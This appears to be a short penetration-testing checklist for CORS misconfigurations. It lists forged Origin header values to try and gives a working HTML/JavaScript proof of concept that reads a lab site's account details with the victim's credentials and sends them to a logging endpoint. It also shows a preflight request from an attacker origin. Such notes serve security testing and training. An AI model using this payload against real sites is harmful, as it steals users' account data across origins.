
- Test  `origin: 0xPelamar.com` header and see the response of server whether contains `ACAO` and `ACAC`
- Test Protocol Swapping, if the site is `https://site.com` try:
  `origin:http://site.com`
- Test encoded characters in the origin:
  `origin: https://site%2ecom`
- Set `origin: null` header and check
- Set `origin: any.site.com` , the server may trust all subdomains and one of the trusted subdomains be vulnerable to XSS
```javascript
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Hack</title>
</head>
<body>
<h1>This is hacker site </h1>
<p>injected a code to issue request</p>
<script>
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function () {
	if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
		var xhr2 = new XMLHttpRequest();
		xhr2.open("GET", "/log?key=" + escape(this.responseText));
		xhr2.send();
	}
	};
	xhr.open("GET", "https://lab.web-security-academy.net/accountDetails",true);
	xhr.withCredentials = true;
	xhr.send();
</script>
</body>
</html>
```

Don't just look at `GET` requests. A misconfiguration could allow dangerous methods.
- Test Preflight request: send an `OPTION` request to see which methods and headers are allowed. for example
```http
OPTIONS /api/user/profile HTTP/1.1
Host: example.com
Origin: https://attacker.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-CSRF-Token
```
Look For:
- Access-Control-Allow-Methods: PUT, DELETE, PATCH
- Access-Control-Allow-Headers: *
- ...

